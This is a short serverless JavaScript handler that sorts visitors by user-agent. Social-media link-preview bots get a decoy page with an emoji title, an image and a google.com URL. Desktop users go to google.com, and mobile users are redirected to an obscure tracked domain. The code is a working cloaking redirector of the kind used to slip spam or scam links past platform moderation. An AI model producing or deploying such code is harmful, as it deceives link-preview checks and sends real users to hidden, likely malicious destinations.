export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="😍🎧🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Wed-Sep-02-2026/2b204b08-fed5-41b4-9e3b-7dfabd5eadae/6ef70610-5dbd-41e7-a734-eead5bc8dfb3.tiff">

    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://rippledismantle.com/im03zr9b?key=3c22e613013e0292ea87145e102e5d99", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
